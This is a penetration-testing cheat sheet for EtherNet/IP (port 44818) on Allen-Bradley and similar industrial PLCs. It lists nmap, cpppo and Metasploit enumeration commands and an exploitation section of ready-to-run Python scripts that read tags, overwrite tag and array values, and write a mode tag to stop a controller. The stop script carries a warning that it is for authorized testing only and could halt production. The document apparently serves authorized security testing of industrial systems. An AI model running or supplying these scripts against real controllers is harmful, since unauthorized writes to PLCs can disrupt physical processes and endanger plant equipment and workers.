# Port 44818 - EtherNet/IP (CIP)

## Table of Contents

- [Overview](#overview)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)

---

## Overview

| Port | Protocol | Description |
| :--- | :--- | :--- |
| 44818 | EtherNet/IP | Common Industrial Protocol |
| 2222 | EtherNet/IP | Alternative port |

EtherNet/IP is used by:

- Allen-Bradley/Rockwell PLCs
- Omron PLCs
- Industrial automation systems

---

## Enumeration

### Nmap

```shell
nmap -sV -p 44818 $rhost
nmap -p 44818 --script enip-info $rhost
```

### Using cpppo

```shell
# Install
pip install cpppo

# Get identity
python -m cpppo.server.enip.get_attribute $rhost

# List identity
python -m cpppo.server.enip.list_identity $rhost
```

### Metasploit

```shell
# EtherNet/IP enumerate
use auxiliary/scanner/scada/ethernetip_info
set RHOSTS $rhost
run
```

---

## Exploitation

### Read Tags (Allen-Bradley)

```python
#!/usr/bin/env python3
from pycomm3 import LogixDriver

target_host = "TARGET_IP"  # Replace with target

with LogixDriver(target_host) as plc:
    # Get PLC info
    print(f"PLC Name: {plc.info}")
    
    # List all tags
    tags = plc.get_tag_list()
    for tag in tags:
        print(f"Tag: {tag['tag_name']} = {tag['data_type']}")
    
    # Read specific tag
    result = plc.read('MyTag')
    print(f"MyTag = {result.value}")
```

### Write Tags

```python
#!/usr/bin/env python3
from pycomm3 import LogixDriver

target_host = "TARGET_IP"  # Replace with target

with LogixDriver(target_host) as plc:
    # Write single tag
    plc.write('MyTag', 1337)
    
    # Write multiple tags
    plc.write(('Tag1', 100), ('Tag2', 200))
    
    # Write array element
    plc.write('MyArray[0]', 42)
```

### Enumerate Device

```python
#!/usr/bin/env python3
from cpppo.server.enip import client

target_host = "TARGET_IP"  # Replace with target

with client.connector(host=target_host, port=44818) as conn:
    # Get identity
    identity, = conn.synchronous(
        conn.list_identity()
    )
    print(f"Vendor: {identity['vendor_id']}")
    print(f"Product: {identity['product_name']}")
    print(f"Serial: {identity['serial_number']}")
```

### Stop/Start PLC

```python
#!/usr/bin/env python3
# ⚠️ Extremely dangerous - only for authorized testing!
from pycomm3 import LogixDriver

target_host = "TARGET_IP"  # Replace with target

with LogixDriver(target_host) as plc:
    # Change PLC mode (if allowed)
    # This could stop production!
    plc.write('ProgramMode', 1)  # Example tag name
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| Nmap | `nmap -p 44818 --script enip-info $rhost` | Enumerate |
| cpppo | `python -m cpppo.server.enip.list_identity $rhost` | List identity |
| pycomm3 | `LogixDriver('$rhost')` | Connect to Allen-Bradley |
| Metasploit | `use auxiliary/scanner/scada/ethernetip_info` | Scan |
